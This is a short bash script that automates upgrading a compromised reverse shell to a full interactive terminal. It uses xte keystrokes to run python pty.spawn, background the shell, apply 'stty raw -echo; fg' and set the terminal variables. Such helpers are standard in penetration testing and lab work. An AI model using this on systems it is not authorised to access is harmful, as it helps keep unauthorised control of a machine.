#!/bin/bash

execute(){
	 xte "str $1"
	 xte "key Return"
	 sleep 1
}

sleep 1
xte "mouseclick 1"
execute "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
execute "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
xte "keydown Control_L" "keydown Z" 
sleep 1
xte "keyup Control_L" "keyup Z"
sleep 1
execute "stty raw -echo; fg"
execute "reset"
execute "xterm"
execute "export SHELL=bash"
execute "export TERM=xterm"
execute "stty rows 52 columns 187"
execute "reset"
